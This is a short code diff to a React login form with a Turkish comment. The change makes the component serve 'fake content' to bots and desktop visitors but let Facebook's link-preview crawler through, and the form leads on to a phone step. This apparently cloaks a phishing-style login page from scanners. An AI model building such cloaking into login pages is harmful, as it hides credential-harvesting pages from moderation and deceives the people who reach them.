@@ -37,7 +37,7 @@ function LoginForm({ isBot }) {
     navigate('/telefon', { state: { isValidNavigation: true } });
   };
 
-  // Bot veya desktop için sahte içerik
+  // Bot (facebookexternalhit hariç) veya desktop için sahte içerik
   if (isBot) {
     return (
       <>
